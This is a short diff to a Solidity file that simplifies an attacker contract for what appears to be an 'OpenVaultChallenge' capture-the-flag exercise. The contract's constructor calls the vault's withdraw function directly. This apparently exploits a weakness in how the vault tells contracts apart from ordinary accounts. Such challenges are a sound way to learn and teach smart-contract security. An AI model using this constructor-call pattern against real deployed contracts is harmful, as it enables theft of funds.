@@ -29,10 +29,7 @@ contract OpenVaultChallenge {
 }
 
 contract OpenVaultChallengeAttacker {
-    OpenVaultChallenge openVaultContract;
-
     constructor(OpenVaultChallenge _contract) public {
-        openVaultContract = _contract;
-        openVaultContract.withdraw();
+        _contract.withdraw();
     }
 }
